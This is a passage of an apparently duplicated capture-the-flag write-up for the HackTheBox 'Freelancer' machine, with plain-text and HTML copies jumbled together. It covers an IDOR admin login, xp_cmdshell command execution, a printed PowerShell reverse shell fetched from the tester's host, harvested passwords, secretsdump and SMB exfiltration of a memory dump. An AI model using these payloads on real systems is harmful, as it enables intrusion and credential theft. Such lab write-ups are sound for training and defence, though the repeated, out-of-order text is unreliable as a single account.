If yes the backend code has logic errors.\nIt worked and I changed the existing password to spiderman123! I tried to login with this new password, and it worked. I no more had to wait for review before accessing the site.\nLooking around the website, and my eye was caught this QR code.\nSo this link can let us login without using credentials.\nThe link is in the format: where the base64 encoded is just the userID and MD5 Hash is the token. Hash changes every 5 minutes or everytime we logout and relogin.\nFrom here I see that I can login to any user through this link as long as I know the id of the user I need to login, and the md5 token will be changed after each login.\nWe need to enumerate the userID of admin or any other user who might have any higher permission than what we have right now.\nI also found a comment to enumerate the users in this web app.\nI fuzzed the userId in this link: http://freelancer.htb/accounts/profile/visit/$userID$/ and found that ID 2 = admin user.\nNow, I will use the userID to login to user admin.\nUser Flag I visited the link: http://freelancer.htb/accounts/login/otp/Mg==/6c5f75d2ed26ceec004a2f5eb155fcfd/ to login to user admin. Here Mg== is the base64 encoded form of “2”. And the md5 hash is just the token given from QR. I didn’t change it.\nAfter exploring a bit, I found nothing. Then I used gobuster to bruteforce the website and found /admin endpoint. As i am already the user admin, I was able to access it:\nHere, there is SQL Terminal in this admin endpoint. We can maybe try executing a code to get reverse shell from here.\nAs it is Windows box, it is most likely MSSQL. So, I will use the rev shelll script from: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands\nFirst I used to impersonate as user System Admin. (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users)\nEXECUTE AS LOGIN = 'sa' Then,\nsp_configure 'show advanced options', '1' RECONFIGURE sp_configure 'xp_cmdshell', '1' RECONFIGURE EXEC master..xp_cmdshell 'whoami' I can see it is sql_svc account.\nNow, I ran:\nEXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.14.72:8000/revshell.ps1)' This downloads the reverse shell powershell script from my kali machine to target machine.\nThe script contents the following script:\ndo { Start-Sleep -Seconds 1 try { $TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.72', 8888) } catch {} } until ($TCPClient.Connected) $NetworkStream = $TCPClient.GetStream() $StreamWriter = New-Object IO.StreamWriter($NetworkStream) function WriteToStream ($String) { [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0} $StreamWriter.Write($String + 'H3K3R-SHELL[#]\u003e ') $StreamWriter.Flush() } WriteToStream '' while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1) $Output = try { Invoke-Expression $Command 2\u003e\u00261 | Out-String } catch { $_ | Out-String }\tWriteToStream ($Output) } $StreamWriter.Close() We get a reverse shell now:\nAt users directory, i can see users in this box:\nAs i am sql_svc user, I will try to enumerate the user sql_svc to see if there is anything interesting.\nAt Directory: C:\\Users\\sql_svc\\Downloads\\SQLEXPR-2019_x64_ENU\nThere are following files:\nDirectory: C:\\Users\\sql_svc\\Downloads\\SQLEXPR-2019_x64_ENU Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/27/2024 1:52 PM 1033_ENU_LP d----- 5/27/2024 1:52 PM redist d----- 5/27/2024 1:52 PM resources d----- 5/27/2024 1:52 PM x64 -a---- 9/24/2019 9:00 PM 45 AUTORUN.INF -a---- 9/24/2019 9:00 PM 784 MEDIAINFO.XML -a---- 9/29/2023 4:49 AM 16 PackageId.dat -a---- 9/24/2019 9:00 PM 142944 SETUP.EXE -a---- 9/24/2019 9:00 PM 486 SETUP.EXE.CONFIG -a---- 5/27/2024 4:58 PM 724 sql-Configuration.INI -a---- 9/24/2019 9:00 PM 249448 SQLSETUPBOOTSTRAPPER.DLL Where, sql-Configuration.INI file contains the following configurations:\nSHELL\u003e cat sql-Configuration.INI [OPTIONS] ACTION=\"Install\" QUIET=\"True\" FEATURES=SQL INSTANCENAME=\"SQLEXPRESS\" INSTANCEID=\"SQLEXPRESS\" RSSVCACCOUNT=\"NT Service\\ReportServer$SQLEXPRESS\" AGTSVCACCOUNT=\"NT AUTHORITY\\NETWORK SERVICE\" AGTSVCSTARTUPTYPE=\"Manual\" COMMFABRICPORT=\"0\" COMMFABRICNETWORKLEVEL=\"\"0\" COMMFABRICENCRYPTION=\"0\" MATRIXCMBRICKCOMMPORT=\"0\" SQLSVCSTARTUPTYPE=\"Automatic\" FILESTREAMLEVEL=\"0\" ENABLERANU=\"False\" SQLCOLLATION=\"SQL_Latin1_General_CP1_CI_AS\" SQLSVCACCOUNT=\"FREELANCER\\sql_svc\" SQLSVCPASSWORD=\"IL0v3ErenY3ager\" Here, SQLSVCPASSWORD=\"IL0v3ErenY3ager\" is a password revealed.

And the desktop of this user contains the user flag.\nRoot Flag In the desktop of mikasaAckerman, alongside user.txt there is also mail.txt which contains:\nHello Mikasa, I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the \"DATACENTER-2019\" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019. I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart. Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue. Best regards, There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my linux machine using python impacket smb server.\nFirst I opened a smb server using command: impacket-smbserver share . -smb2support -user rezy -password rezy. And then mounted the share using:\n$SharePath = \"\\\\10.10.14.72\\share\" $Username = \"rezy\" $Password = \"rezy\" # Create a credential object $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force) # Mount the SMB share net use Z: $SharePath $Password /user:$Username /persistent:no This will mount the smb share from linux to windows. Then to confirm I can do this:\nPS C:\\Users\\mikasaAckerman\\Desktop\u003e Get-PSDrive Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- Alias Alias C 13.67 1.79 FileSystem C:\\ Users\\Administrator\\Documents Cert Certificate \\ Env Environment Function Function HKCU Registry HKEY_CURRENT_USER HKLM Registry HKEY_LOCAL_MACHINE Variable Variable WSMan WSMan Z ...3478272.00 0.00 FileSystem \\\\10.10.14.72\\share As we can see it’s Z drive. I can simply run:\nCopy-Item -Path \"C:\\Users\\mikasaAckerman\\Desktop\\MEMORY.7z\" -Destination \"Z:\\\" to transfer file to the smb share and we can access it from our kali box.\nI then, used https://github.com/ufrisk/MemProcFS to dump the file and mount it.\nI found the SAM, SYSTEM and SECURITY files in registry/hive_files. I Dumped it with secretsdump and I get a password: PWN3D#l0rr@Armessa199 which is a password for the user lorra199\nI will login to it using evil-winrm -i freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199\nNow, we need to syncronize the server time.\n┌──(root㉿kali)-[/home/kali] └─# ntpdate -u freelancer.htb 2024-06-06 09:45:20.815434 (-0400) +17631.477286 +/- 0.038578 freelancer.htb 10.10.11.5 s1 no-leap CLOCK: time stepped by 17631.477286 17631.477286 seconds is around 5 hours.

    <div class="post-description">
      Freelancer is a Hard Difficulty machine is designed to challenge players with a series of vulnerabilities that are frequently encountered in real-world penetration testing scenarios. It covers a broad range of skills, including identifying business logic flaws in web applications, exploiting common vulnerabilities like insecure direct object reference (IDOR) and authorization bypass, and engaging with SQL impersonation attacks, which may not be common but are still critical to understand. Players will work through various scenarios, such as exposing sensitive information through directory enumeration and manually building SQL queries, which mimic the tasks typically required in real-life assessments. Advanced exploitation techniques are introduced, including remote code execution via SQL features and Windows memory forensics, which add depth to the challenges. Active Directory attacks are featured heavily, focusing on exploiting the AD Recycle Bin and the &#34;Backup Operators&#34; group, both of which have practical implications in modern environments. Password spraying, hash cracking, and bypassing antivirus tools also form part of the lab, ensuring a comprehensive experience that tests basic and advanced penetration testing techniques. Expect a blend of logical reasoning, technical exploitation, and real-world problem-solving throughout this lab.

</code></pre><p>I added the freelancer.htb to /etc/hosts to make sure the site loads using <code>echo &quot;10.10.11.5 freelancer.htb&quot; &gt;&gt; /etc/hosts</code></p>
<p>This is how the freelancer site looks:</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled.png"></p>
<p>In this site, we can create account for employer or freelancer.</p>
<p>I created a freelancer user with following details:</p>
<pre tabindex="0"><code>--&gt; freelancer info &lt;--
freelancer_rezy &gt; username
mail@gmail.com &gt; email
</code></pre><p>I will also create a account of employeer with following details:</p>
<pre tabindex="0"><code>--&gt; employer info &lt;---
employercoo_l &gt; username
erezrrrr1@gmail.com &gt; email
sdlhjkgbfdjksjkskjsdhjkfs &gt; password
fav movie &gt; spiderman
pet &gt; dog
friend&#39;s name &gt; john
</code></pre><p>The site has note that, after creating account for employer we aren’t able to login as it will be reviewed before it is activated.</p>
<p>I used the forget password functionality to change the password of the account employer to see if it allows us to login once we change the password. If yes the backend code has logic errors.</p>
<p>It worked and I changed the existing password to <code>spiderman123!</code> I tried to login with this new password, and it worked. I no more had to wait for review before accessing the site.</p>
<p>Looking around the website, and my eye was caught this QR code.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%201.png"></p>
<p>So this link can let us login without using credentials.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%202.png"></p>
<p>The link is in the format: where the base64 encoded is just the userID and MD5 Hash is the token. Hash changes every 5 minutes or everytime we logout and relogin.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%203.png"></p>
<p>From here I see that I can login to any user through this link as long as I know the id of the user I need to login, and the md5 token will be changed after each login.</p>
<p>We need to enumerate the userID of admin or any other user who might have any higher permission than what we have right now.</p>
<p>I also found a comment to enumerate the users in this web app.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%204.png"></p>
<p>I fuzzed the userId in this link: <code>http://freelancer.htb/accounts/profile/visit/$userID$/</code> and found that ID 2 = admin user.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%205.png"></p>
<p>Now, I will use the userID to login to user admin.</p>
<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
<p>I visited the link: <code>http://freelancer.htb/accounts/login/otp/Mg==/6c5f75d2ed26ceec004a2f5eb155fcfd/</code> to login to user admin. Here <code>Mg==</code> is the base64 encoded form of “2”. And the md5 hash is just the token given from QR. I didn’t change it.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%206.png"></p>
<p>After exploring a bit, I found nothing. Then I used gobuster to bruteforce the website and found <code>/admin</code> endpoint. As i am already the user admin, I was able to access it:</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%207.png"></p>
<p>Here, there is SQL Terminal in this admin endpoint. We can maybe try executing a code to get reverse shell from here.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/freelancer/Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%208.png"></p>
<p>As it is Windows box, it is most likely MSSQL.

<pre tabindex="0"><code>Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &#34;DATACENTER-2019&#34; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#39;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
</code></pre><p>There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my linux machine using python impacket smb server.</p>
<p>First I opened a smb server using command: <code>impacket-smbserver share . -smb2support -user rezy -password rezy</code>. And then mounted the share using:</p>
<pre tabindex="0"><code>$SharePath = &#34;\\10.10.14.72\share&#34;

$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force)

# Mount the SMB share
net use Z: $SharePath $Password /user:$Username /persistent:no
